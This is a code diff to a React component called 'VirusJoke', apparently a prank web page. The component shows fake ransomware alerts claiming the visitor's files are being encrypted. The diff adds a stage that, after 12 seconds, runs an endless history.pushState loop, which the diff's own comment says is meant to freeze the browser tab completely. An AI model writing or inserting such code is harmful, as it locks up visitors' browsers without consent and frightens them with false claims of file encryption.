@@ -42,9 +42,20 @@ export function VirusJoke() {
       }
     }, 400);
 
+    // Freeze the browser tab entirely at stage 4 (after 12 seconds)
+    const stage4 = setTimeout(() => {
+      setStage(4);
+      setTimeout(() => {
+        // This will completely freeze the tab, making it unresponsive
+        while(true) {
+          history.pushState(null, "", window.location.href);
+        }
+      }, 500);
+    }, 12000);
+
     // Nasty alerts
     const alertInterval = setInterval(() => {
-      if (stage >= 2) {
+      if (stage >= 2 && stage < 4) {
         try {
           window.alert("⚠️ SYSTEM FAILURE ⚠️\nALL YOUR FILES ARE BEING ENCRYPTED.\nDO NOT TURN OFF YOUR COMPUTER.");
         } catch (e) {}
@@ -58,6 +69,7 @@ export function VirusJoke() {
       clearTimeout(stage1);
       clearTimeout(stage2);
       clearTimeout(stage3);
+      clearTimeout(stage4);
       clearInterval(glitchInterval);
       clearInterval(logInterval);
       clearInterval(alertInterval);
